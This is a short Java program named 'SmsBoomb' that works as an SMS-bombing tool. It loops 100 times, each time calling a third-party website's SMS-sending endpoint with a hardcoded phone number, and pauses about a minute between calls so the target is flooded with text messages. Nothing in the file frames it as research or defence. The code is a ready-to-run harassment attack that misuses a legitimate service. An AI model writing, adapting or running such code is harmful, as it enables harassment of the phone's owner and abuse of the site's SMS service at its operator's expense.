package test;

import java.util.HashMap;
import java.util.Map;
import java.util.Random;

import org.axe.util.HttpUtil;
import org.axe.util.StringUtil;

public class SmsBoomb {
	public static void main(String[] args) {
		try {
			String tel = "13915729136";
			String url = "http://www.zjghfw.com/guest/sms.php?mobile="+tel;
			for(int i=0;i<100;i++){
				String sendPost = HttpUtil.sendGet(url);
				System.out.println(sendPost);
				String sec = "6"+StringUtil.getRandomString(1, "123456789")+"000";
				Thread.sleep(Integer.parseInt(sec));
			}
		} catch (Exception e) {
		}
	}
}
